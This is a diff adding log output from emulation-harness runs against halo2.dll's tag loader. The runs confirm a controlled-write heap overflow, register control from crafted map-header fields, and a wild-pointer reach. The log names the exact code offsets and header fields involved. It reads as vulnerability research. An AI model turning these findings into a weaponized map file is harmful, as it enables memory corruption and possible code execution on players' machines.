@@ -1,0 +1,112 @@
+# halo2.dll Blam tag-loader harness runs  (halo2.dll sha256 de65b4f4...171946)
+# target fn 0x6c9970 (body 0x6c9977); section-read call 0x6c9ad5; tag-math 0x6c9c5c
+# unicorn 2.1.4 / pefile 2024.8.26 / capstone 5.0.7 ; 2026-10-21T04:54:35Z
+
+===== CONTROL: unmodified ascension header (loads clean) =====
+[alloc] size=0x33d8000 (req) -> base=0x300000000 mapped=0x33d8000 guard@0x3033d8000
+    --- REGISTER STATE at section-read call 0x6c9ad5 (controlled write) ---
+      r9  (dst)  = 0x303200000   = g_tagmem(0x300000000) + 0x3200000
+      r8d (size) = 0x5b000   = align128(hdr[+0x2d4])
+      edx (foff) = 0x25b200   = hdr[+0x10]
+      rcx        = 0xffffffff
+      write-dest offset-from-heap-base = 0x3200000  (= attacker hdr[+0x2d0], sign-extended)
+[read] off=0x25b200 size=0x5b000 dst=0x303200000 alloc=[0x300000000,0x3033d8000) dst_off=0x3200000
+[read] off=0x2b6200 size=0x17d000 dst=0x30325b000 alloc=[0x300000000,0x3033d8000) dst_off=0x325b000
+[done] function returned, rax=0x0
+
+=== SUMMARY ===
+ alloc base=0x300000000 req_size=0x33d8000 mapped=0x33d8000
+ read off=0x25b200 size=0x5b000 dst=0x303200000
+ read off=0x2b6200 size=0x17d000 dst=0x30325b000
+
+===== CONFIRMED controlled-write overflow (hdr_oob1) =====
+[alloc] size=0x1000 (req) -> base=0x300000000 mapped=0x1000 guard@0x300001000
+    --- REGISTER STATE at section-read call 0x6c9ad5 (controlled write) ---
+      r9  (dst)  = 0x300001000   = g_tagmem(0x300000000) + 0x1000
+      r8d (size) = 0x4000   = align128(hdr[+0x2d4])
+      edx (foff) = 0x0   = hdr[+0x10]
+      rcx        = 0xffffffff
+      write-dest offset-from-heap-base = 0x1000  (= attacker hdr[+0x2d0], sign-extended)
+[read] off=0x0 size=0x4000 dst=0x300001000 alloc=[0x300000000,0x300001000) dst_off=0x1000  *** READ OVERRUNS ALLOC BY 0x4000 BYTES ***
+[FAULT] Invalid memory write (UC_ERR_WRITE_UNMAPPED) @ rip=0x1806c9ad5 (rva 0x6c9ad5)
+        insn: call 0x18067bbb0
+        rax=0x4000
+        rbx=0x300001000
+        rcx=0xffffffff
+        rdx=0x0
+        rsi=0x1000
+        rdi=0x1
+        r8=0x4000
+        r9=0x300001000
+        r14=0x1000
+        r15=0x1000
+
+=== SUMMARY ===
+ alloc base=0x300000000 req_size=0x1000 mapped=0x1000
+ read off=0x0 size=0x4000 dst=0x300001000
+ FAULT: Invalid memory write (UC_ERR_WRITE_UNMAPPED) @ 0x1806c9ad5
+
+===== REGISTER CONTROL (sentinel fields -> registers) hdr_regctl =====
+[alloc] size=0x414140 (req) -> base=0x300000000 mapped=0x415000 guard@0x300415000
+    --- REGISTER STATE at section-read call 0x6c9ad5 (controlled write) ---
+      r9  (dst)  = 0x300414140   = g_tagmem(0x300000000) + 0x414140
+      r8d (size) = 0x2000   = align128(hdr[+0x2d4])
+      edx (foff) = 0x11223300   = hdr[+0x10]
+      rcx        = 0xffffffff
+      write-dest offset-from-heap-base = 0x414140  (= attacker hdr[+0x2d0], sign-extended)
+[read] off=0x11223300 size=0x2000 dst=0x300414140 alloc=[0x300000000,0x300414140) dst_off=0x414140  *** READ OVERRUNS ALLOC BY 0x2000 BYTES ***
+[FAULT] Invalid memory write (UC_ERR_WRITE_UNMAPPED) @ rip=0x1806c9ad5 (rva 0x6c9ad5)
+        insn: call 0x18067bbb0
+        rax=0x2000
+        rbx=0x300414140
+        rcx=0xffffffff
+        rdx=0x11223300
+        rsi=0x414140
+        rdi=0x1
+        r8=0x2000
+        r9=0x300414140
+        r14=0x414140
+        r15=0x414140
+
+=== SUMMARY ===
+ alloc base=0x300000000 req_size=0x414140 mapped=0x415000
+ read off=0x11223300 size=0x2000 dst=0x300414140
+ FAULT: Invalid memory write (UC_ERR_WRITE_UNMAPPED) @ 0x1806c9ad5
+
+===== TARGETED tag-count wild-pointer reach (poc_tagcount.map) =====
+# NOTE: the 0x6c9d50 fault here is a HARNESS STUB ARTIFACT (r8=NULL: the real
+#       tag-registration list is not modeled).  The REAL result is the be240
+#       line: wild ptr = g_tags + 12*tagcount + 32, built on real code at 0x6c9c5c.
+[alloc] size=0x3000 (req) -> base=0x300000000 mapped=0x3000 guard@0x300003000
+    --- REGISTER STATE at section-read call 0x6c9ad5 (controlled write) ---
+      r9  (dst)  = 0x300001000   = g_tagmem(0x300000000) + 0x1000
+      r8d (size) = 0x1000   = align128(hdr[+0x2d4])
+      edx (foff) = 0x1000   = hdr[+0x10]
+      rcx        = 0xffffffff
+      write-dest offset-from-heap-base = 0x1000  (= attacker hdr[+0x2d0], sign-extended)
+[read] off=0x1000 size=0x1000 dst=0x300001000 alloc=[0x300000000,0x300003000) dst_off=0x1000
+[read] off=0x2000 size=0x100 dst=0x300002f00 alloc=[0x300000000,0x300003000) dst_off=0x2f00
+[read] off=0x2200 size=0x400 dst=0x210000000
+[read] off=0x2400 size=0x100 dst=0x210000000
+    [be240] register ptr=0x300001020  (rip rva 0x6c9c3e)  g_tagmem+0x1020
+    [be240] register ptr=0x480001020  (rip rva 0x6c9c5c)  g_tagmem+0x180001020
+[FAULT] Invalid memory read (UC_ERR_READ_UNMAPPED) @ rip=0x1806c9d50 (rva 0x6c9d50)
+        insn: movsxd rax, dword ptr [r8 + rcx*8 + 8]
+        rax=0x300000000
+        rbx=0x0
+        rcx=0x0
+        rdx=0x300001000
+        rsi=0x0
+        rdi=0x1
+        r8=0x0
+        r9=0x300000000
+        r14=0x0
+        r15=0x0
+
+=== SUMMARY ===
+ alloc base=0x300000000 req_size=0x3000 mapped=0x3000
+ read off=0x1000 size=0x1000 dst=0x300001000
+ read off=0x2000 size=0x100 dst=0x300002f00
+ read off=0x2200 size=0x400 dst=0x210000000
+ read off=0x2400 size=0x100 dst=0x210000000
+ FAULT: Invalid memory read (UC_ERR_READ_UNMAPPED) @ 0x1806c9d50
